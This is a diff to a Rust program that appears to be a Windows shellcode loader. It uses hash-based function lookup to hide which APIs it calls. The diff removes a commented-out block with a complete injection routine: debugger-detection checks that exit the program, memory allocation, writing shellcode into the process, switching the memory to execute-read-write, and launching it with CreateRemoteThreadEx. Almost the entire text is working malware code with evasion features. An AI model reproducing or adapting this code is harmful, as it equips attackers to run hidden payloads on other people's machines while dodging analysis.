@@ -190,7 +190,7 @@ fn main() {
 
     //getFuncAddressByHash("kernel32", 0xf92f7b);
 
-    println!("{:#x}", getHashFromFunc("VirtualFree"));
+    //println!("{:#x}", getHashFromFunc("VirtualFree"));
 
     let pid = process::id();
 
@@ -222,7 +222,7 @@ fn main() {
             PAGE_READWRITE,
         );
 
-        //println!("{:?}", haddr);
+        println!("{:?}", haddr);
         if haddr.is_null() {
             eprintln!("[!] Failed to Allocate Memory in Target Process.");
             let _ = CloseHandle(hprocess);
@@ -285,93 +285,5 @@ fn main() {
 
 
         println!("[+] Executed!");
-                
-
-        /* match XOpenProcess(PROCESS_ALL_ACCESS, false.into(), pid) {
-            Ok(hprocess) => 'p: {
-                let mut debugger_present: BOOL = BOOL(0);
-
-                if CheckRemoteDebuggerPresent(hprocess, &mut debugger_present as *mut BOOL).is_ok() && debugger_present.as_bool() {
-                    process::exit(-1);
-                }
-
-                if IsDebuggerPresent().as_bool(){
-                    process::exit(-1);
-                }
-
-                let haddr = VirtualAllocEx(
-                    hprocess,
-                    Some(null_mut()),
-                    shellcode.len(),
-                    MEM_COMMIT | MEM_RESERVE,
-                    PAGE_READWRITE,
-                );
-
-                if haddr.is_null() {
-                    eprintln!("[!] Failed to Allocate Memory in Target Process.");
-                    let _ = CloseHandle(hprocess);
-                    process::exit(-1)
-                }
-
-                println!("[i] Writing to memory at address {:p}", haddr);
-                WriteProcessMemory(
-                    hprocess,
-                    haddr, 
-                    shellcode.as_ptr() as _,
-                    shellcode.len(),
-                    None,).unwrap_or_else(|e| {
-                        eprintln!("[!] WriteProcessMemory Failed With Error: {}", e);
-                        let _ = CloseHandle(hprocess);
-                        process::exit(-1);
-                    }
-                );
-
-                let mut oldprotect: PAGE_PROTECTION_FLAGS = PAGE_PROTECTION_FLAGS(0);
-                VirtualProtectEx(
-                    hprocess,
-                    haddr,
-                    shellcode.len(),
-                    PAGE_EXECUTE_READWRITE,
-                    &mut oldprotect,).unwrap_or_else(|e| {
-                    eprintln!("[!] VirtualProtectEx Failed With Error: {}", e);
-                    let _ = CloseHandle(hprocess);
-                    process::exit(-1);
-                });
-                
-                println!("[+] Creating a Remote Thread");
-                let hthread = CreateRemoteThreadEx(
-                    hprocess,
-                    Some(null()),
-                    0,
-                    Some(std::mem::transmute(haddr)),
-                    Some(null()),
-                    0,
-                    None,
-                    Some(null_mut()),).unwrap_or_else(|e| {
-                        eprintln!("[!] CreateRemoteThreadEx Failed With Error: {}", e);
-                        let _ = CloseHandle(hprocess);
-                        process::exit(-1);
-                    }
-                );
-
-                WaitForSingleObject(hthread, INFINITE);
-
-                let _ = CloseHandle(hthread);
-                println!("[i] Closed thread handle");
-
-                let _ = CloseHandle(hprocess);
-                println!("[i] Closed process handle");
-
-                let _ = VirtualFree(haddr, 0, MEM_RELEASE);
-                println!("[i] Memory released");
-
-
-                println!("[+] Executed!");
-                break 'p;
-            }
-            Err(e) => {
-                eprintln!("[!] Error Getting Process Identifier {e}");
-            }
-        } */
     }
 }
